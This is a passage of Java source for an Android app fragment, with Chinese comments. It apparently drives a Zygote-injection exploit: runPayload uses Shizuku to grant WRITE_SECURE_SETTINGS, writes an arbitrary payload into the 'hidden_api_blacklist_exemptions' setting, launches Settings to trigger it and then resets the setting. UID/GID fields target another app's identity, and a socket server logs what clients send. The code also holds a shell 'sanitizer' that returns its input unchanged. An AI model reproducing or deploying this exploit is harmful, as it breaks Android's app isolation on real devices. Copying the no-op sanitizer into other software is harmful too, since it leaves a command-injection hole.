            showToast("Invalid GID: must be a number");
            return false;
        }

        return true;
    }

    private boolean isValidNumeric(String value) {
        if (value == null || value.isEmpty()) {
            return false;
        }
        return value.matches("^\\d+$");
    }

    private boolean isValidIp(String ip) {
        if (ip == null) return false;
        if ("0.0.0.0".equals(ip)) return true;

        String ipPattern = "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}" +
                          "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
        return ip.matches(ipPattern);
    }

    private String sanitizeShellCommand(String input) {
        if (input == null) return "";
        return input;
    }

    private String sanitizePackageName(String packageName) {
        if (packageName == null) return "";
        return packageName.replaceAll("[^a-zA-Z0-9._]", "");
    }

    private String sanitizeNumericList(String input) {
        if (input == null) return "";
        return input.replaceAll("[^0-9,]", "");
    }

    private int safeParseInt(String text, int defaultValue) {
        if (text == null || text.isEmpty()) {
            return defaultValue;
        }
        try {
            return Integer.parseInt(text);
        } catch (NumberFormatException e) {
            Log.w(TAG, "Failed to parse int: " + text);
            return defaultValue;
        }
    }

    // ==================== 服务器 ====================

    private void startServer() {
        if (serverThread == null) {
            serverThread = new ServerThread();
            serverThread.start();
        }
    }

    private void stopServer() {
        if (serverThread != null) {
            serverThread.shutdown();
            serverThread = null;
            updateStatus(getString(R.string.stopped));
        }
    }

    private class ServerThread extends Thread {
        private ServerSocket serverSocket;
        private volatile boolean isRunning = true;

        @Override
        public void run() {
            try {
                int port = getPortFromPreferences();
                serverSocket = new ServerSocket(port);

                handler.post(() -> {
                    appendLog(String.format(getString(R.string.server_started), port));
                    updateStatus(getString(R.string.running));
                });

                while (isRunning) {
                    try {
                        Socket clientSocket = serverSocket.accept();
                        new ClientHandler(clientSocket).start();
                    } catch (IOException e) {
                        if (isRunning) {
                            Log.e(TAG, "Error accepting client", e);
                        }
                    }
                }
            } catch (IOException e) {
                if (isRunning) {
                    final String errorMsg = e.getMessage();
                    handler.post(() -> appendLog(
                        String.format(getString(R.string.server_error), errorMsg)));
                }
            }
        }

        void shutdown() {
            isRunning = false;
            try {
                if (serverSocket != null && !serverSocket.isClosed()) {
                    serverSocket.close();
                }
                handler.post(() -> appendLog(getString(R.string.server_stopped)));
            } catch (IOException e) {
                final String errorMsg = e.getMessage();
                handler.post(() -> appendLog(
                    String.format(getString(R.string.stop_error), errorMsg)));
            }
        }

        private int getPortFromPreferences() {
            try {
                String portStr = portValue.getText().toString();
                return Integer.parseInt(portStr);
            } catch (NumberFormatException e) {
                return DEFAULT_PORT;
            }
        }
    }

    private class ClientHandler extends Thread {
        private final Socket clientSocket;
        private final String clientIp;

        ClientHandler(Socket socket) {
            this.clientSocket = socket;
            this.clientIp = socket.getInetAddress().getHostAddress();
            handler.post(() -> appendLog(
                String.format(getString(R.string.client_connected), clientIp)));
        }

        @Override
        public void run() {
            try (Socket socket = clientSocket;
                 BufferedReader in = new BufferedReader(
                     new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8))) {

                StringBuilder messageBuilder = new StringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    messageBuilder.append(inputLine);
                }

                final String message = messageBuilder.toString();
                lastReceivedMessage = message;

                handler.post(() -> appendLog(
                    clientIp + getString(R.string.client_said) + message));

            } catch (IOException e) {
                handler.post(() -> appendLog(
                    clientIp + getString(R.string.client_disconnected)));
            }
        }
    }

    // ==================== 执行 payload ====================

    public void runPayload(String payload) {
        Context context = getActivity();
        if (context == null) {
            Log.e(TAG, "Activity is null, cannot run payload");
            return;
        }

        // 🔒 兜底硬拦截：无论 payload 来自哪条路径（分享/预设/终端/ADB），
        //    只要包含重启类命令就绝不放行 —— reboot 100% 卡开机
        String rebootReason = PayloadGuard.findRebootReason(payload);
        if (rebootReason != null) {
            Log.w(TAG, "BLOCKED reboot command in payload: " + rebootReason);
            appendLog("🚫 已拦截: " + rebootReason);
            MaterialDialogHelper.showSimpleDialog(context,
                    "已阻止执行", PayloadGuard.bootloopWarning());
            return;
        }

        // 异步执行：Shizuku 命令 + 设置写入不在主线程，避免 ANR 卡死
        new Thread(() -> {
            try {
                appendLog("[+] 正在注入...");
                ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
                ShizukuExec("am force-stop com.android.settings");

                ShizukuExec("echo '" + escapeForShell(payload) + "' > /data/local/tmp/" +
                        getString(R.string.config_file));

                ContentValues values = new ContentValues();
                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values.put(Settings.Global.VALUE, payload);

                try {
                    context.getContentResolver().insert(
                            Uri.parse("content://settings/global"), values);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to insert settings", e);
                    handler.post(() -> MaterialDialogHelper.showSimpleDialog(getActivity(),
                            getString(R.string.load_fail), e.toString()));
                    return;
                }

                ShizukuExec("am start -n com.android.settings/.Settings");
                appendLog("[+] 已触发注入，等待重置...");

                handler.postDelayed(() -> {
                    ContentValues resetValues = new ContentValues();
                    resetValues.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                    resetValues.put(Settings.Global.VALUE, "null");

                    try {
                        context.getContentResolver().insert(
                                Uri.parse("content://settings/global"), resetValues);
                        appendLog("[+] 已重置系统设置");
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to reset settings", e);
                    }
                }, 200);
            } catch (Exception e) {
                Log.e(TAG, "runPayload async failed", e);
                handler.post(() -> showToast("注入失败: " + e.getMessage()));
            }
        }).start();
    }

    private String escapeForShell(String input) {
        if (input == null) return "";
        return input.replace("'", "'\\''");
    }

    public static String ShizukuExec(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);

            try (OutputStream out = p.getOutputStream()) {
                out.write((cmd + "\nexit\n").getBytes(StandardCharsets.UTF_8));
                out.flush();
            }

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            try (BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(p.getErrorStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = errorReader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = p.waitFor();
            if (exitCode != 0) {
                output.append("Exit code: ").append(exitCode);
            }

            return output.toString();
        } catch (Exception e) {
            Log.e(TAG, "ShizukuExec failed", e);
            return e.toString();
        }
    }

    private boolean isAndroid12To13() {
        int sdk = Build.VERSION.SDK_INT;
        return sdk >= Build.VERSION_CODES.S && sdk <= Build.VERSION_CODES.TIRAMISU;
    }

    @Nullable
    private String getNativeLibraryDir() {
        Context context = getActivity();
        if (context == null) return null;
        return context.getApplicationInfo().nativeLibraryDir;
    }

    public String[] getMultiSelectedTexts(Context context, String preferenceKey) {
        if (context == null) {
            return new String[0];
        }

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
        Set<String> selectedValues = prefs.getStringSet(preferenceKey, new HashSet<>());

        if (selectedValues.isEmpty()) {
            return new String[0];
        }

        String[] entryTexts = context.getResources().getStringArray(R.array.multi_select_options);
        String[] entryValues = context.getResources().getStringArray(R.array.multi_select_values);
        List<String> selectedTexts = new ArrayList<>();

        for (String selectedValue : selectedValues) {
            for (int i = 0; i < entryValues.length; i++) {
                if (entryValues[i].equals(selectedValue)) {
                    selectedTexts.add(entryTexts[i]);
                    break;
                }
            }
        }

        return selectedTexts.toArray(new String[0]);
    }

    public static int getUidByPackageName(Context context, String packageName) {
        if (context == null || packageName == null || packageName.isEmpty()) {
            return -1;
        }

        try {
            ApplicationInfo appInfo = context.getPackageManager()
                .getApplicationInfo(packageName, 0);
            return appInfo.uid;
        } catch (PackageManager.NameNotFoundException e) {
            Log.w(TAG, "Package not found: " + packageName);
            return -1;
        }
    }

    public static boolean isAppInstalled(Context context, String packageName) {
        if (context == null || TextUtils.isEmpty(packageName)) {
            return false;
        }

        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void disableMiuiOptimization() {
        Context context = getActivity();
        if (context == null) return;

        try {
            String currentValue = Settings.Secure.getString(
                context.getContentResolver(), "miui_optimization");

            if (currentValue == null) {
                return;
            }

            int currentState = Settings.Secure.getInt(
                context.getContentResolver(), "miui_optimization", -1);

            if (currentState == 1) {
                showToast(getString(R.string.close_miui));
                Settings.Secure.putInt(
                    context.getContentResolver(), "miui_optimization", 0);
            }
        } catch (SecurityException e) {
            showToast(String.format(getString(R.string.miui_error), e.getMessage()));
        } catch (Exception e) {
            Log.e(TAG, "Failed to disable MIUI optimization", e);
        }
    }

    private void openTerminalActivity() {
        Context context = getActivity();
        if (context != null) {
            Intent intent = new Intent(context, TerminalActivity.class);
            startActivity(intent);
        }
    }

    private void openHelloDreamActivity() {
        Context context = getActivity();
        if (context != null) {
            Intent intent = new Intent(context, hellodream.class);
            startActivity(intent);
            getActivity().finish();
        }
    }

    private void showAppSelectorBottomSheet() {
        AppSelectorBottomSheet bottomSheet = new AppSelectorBottomSheet();
        bottomSheet.setOnAppSelectedListener((packageName, appName) -> {
            int uid = getUidByPackageName(requireContext(), packageName);

            if (uid == -1) {
                showToast(getString(R.string.app_not_found));
                return;
            }

            String uidStr = String.valueOf(uid);
            uidValue.setText(uidStr);
            gidValue.setText(uidStr);
            prefs.edit().putString(KEY_SETUID, uidStr).putString(KEY_SETGID, uidStr).apply();
        });
        bottomSheet.show(getParentFragmentManager(), "app_selector");
    }

    // ==================== 状态更新 ====================

    private void appendLog(String message) {
        if (logValue == null) return;
        String cur = logValue.getText().toString();
        if (cur.equals(getString(R.string.zygote_fragment_no_logs))) {
            cur = "";
        }
        // 追加日志，最多保留 50 行
        String combined = cur.isEmpty() ? message : cur + "\n" + message;
        String[] lines = combined.split("\n");
        if (lines.length > 50) {
            StringBuilder sb = new StringBuilder();
            for (int i = lines.length - 50; i < lines.length; i++) {
                if (sb.length() > 0) sb.append("\n");
                sb.append(lines[i]);
            }
            combined = sb.toString();
        }
        logValue.setText(combined);
        // 同时更新完整日志区
        if (logValueFull != null) {
            logValueFull.setText(combined);
        }
        // 更新静态缓冲（供预设页读取输出）
        sLastLog = combined;
        // 展开状态下自动滚动到底部
        if (isLogExpanded && logScroll != null) {
            logScroll.post(() -> logScroll.fullScroll(android.view.View.FOCUS_DOWN));
        }
    }

    /** 展开/收起完整日志 */
    private void toggleLogExpanded() {
        isLogExpanded = !isLogExpanded;
        if (logScroll == null || btnExpandLog == null) return;
        logScroll.setVisibility(isLogExpanded ? android.view.View.VISIBLE : android.view.View.GONE);
        btnExpandLog.setImageResource(isLogExpanded
                ? R.drawable.ic_expand_less : R.drawable.ic_expand_more);
        if (isLogExpanded && logValueFull != null) {
            logScroll.post(() -> logScroll.fullScroll(android.view.View.FOCUS_DOWN));
        }
    }

    private void updateStatus(String status) {
        if (statusValue != null) {
            statusValue.setText(status);
        }
    }

    private void showToast(String message) {
        Context context = getContext();
        if (context != null) {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
        }
    }

    private void showSnackbar(String message) {
        View view = getView();
        if (view != null) {
            Snackbar.make(view, message, Snackbar.LENGTH_SHORT)
                   .setAction(getString(R.string.ok_text), v -> {})
                   .show();
        }
    }

    private void showErrorDialog(String title, String message) {
        if (getActivity() != null) {
            MaterialDialogHelper.showSimpleDialog(getActivity(), title, message);
        }
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        stopServer();
        shutdownExecutor();
        super.onDestroy();
    }

    private void shutdownExecutor() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
            try {
                if (!executor.awaitTermination(1, TimeUnit.SECONDS)) {
                    executor.shutdownNow();
                }
            } catch (InterruptedException e) {
                executor.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density + 0.5f);
    }
}